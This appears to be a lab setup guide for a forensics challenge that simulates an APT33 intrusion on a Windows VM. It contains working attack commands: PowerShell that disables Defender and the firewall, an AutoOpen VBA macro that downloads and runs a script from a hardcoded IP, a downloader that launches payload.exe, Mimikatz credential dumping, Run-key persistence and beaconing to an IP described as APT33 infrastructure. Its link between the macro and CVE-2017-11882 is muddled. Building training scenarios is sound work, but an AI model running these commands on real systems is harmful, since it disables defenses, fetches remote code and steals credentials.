## 🛠️ Step 2: Preparing the VM for the APT33 Attack Simulation

This section prepares the attack scenario involving APT33 tactics and tools. These steps are aligned with the challenge questions.

---

### 🔒 Step 1: Disable Windows Defender and Windows Firewall

**Goal:** Weaken system defenses to allow malicious activity without interruption.

Run the following PowerShell commands:

`Set-MpPreference -DisableRealtimeMonitoring $true Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False`

---

### 📄 Step 2: Deploy the Malicious Document (Initial Infection Vector)

A file disguised as a `.png` is actually a `.docx` with an embedded macro that exploits **CVE-2017-11882**.

1. Download or create a **fake image file** with a `.png` extension.
    
2. Change its signature bytes to match a valid Office document (e.g., `50 4B 03 04` for ZIP/Office Open XML).
    
3. Rename it to `malicious_doc.docx`.
    
4. Inside the document, insert a VBA macro that triggers on open:
    

vba

CopyEdit

`Sub AutoOpen()     Set objShell = CreateObject("WScript.Shell")     objShell.Run "powershell.exe -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString('http://185.234.1.56/malware.ps1')" End Sub`

Save it in:  
`C:\Users\analyst\Documents\malicious_doc.docx`

---

### 💻 Step 3: Drop the PowerShell Malware Script

The macro will download and execute this PowerShell script from the attacker's server.

Create the file:  
`C:\Users\analyst\AppData\Roaming\malware.ps1`

powershell

CopyEdit

`# Simulated malware download and execution Invoke-WebRequest -Uri http://185.234.1.56/payload.exe -OutFile "C:\Users\analyst\AppData\Local\Temp\payload.exe" Start-Process "C:\Users\analyst\AppData\Local\Temp\payload.exe"`

The script fetches the **payload.exe** used in later analysis.

---

### 🛠️ Step 4: Execute Credential Dumping with Mimikatz

Download [Mimikatz](https://github.com/gentilkiwi/mimikatz) and extract it into:  
`C:\Users\analyst\Documents\mimikatz\`

Run it from PowerShell or CMD:

powershell

CopyEdit

`C:\Users\analyst\Documents\mimikatz\x64\mimikatz.exe`

Once inside the tool, execute:

plaintext

CopyEdit

`privilege::debug sekurlsa::logonPasswords`

This simulates administrator credential dumping.

---

### 🧬 Step 5: Establish Persistence via Registry Key

To simulate persistence:

powershell

CopyEdit

`Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "UpdaterSvc" -Value "C:\Users\analyst\AppData\Local\Temp\payload.exe"`

This causes `payload.exe` to auto-launch at user login.

---

### 🌐 Step 6: Simulate Command & Control (C2) Communication

A PowerShell command is used to simulate beaconing to the attacker-controlled infrastructure:

powershell

CopyEdit

`Invoke-WebRequest -Uri http://103.236.149.100/`

This IP address is associated with **APT33 infrastructure** and is used to trigger alerts or visibility in the memory image.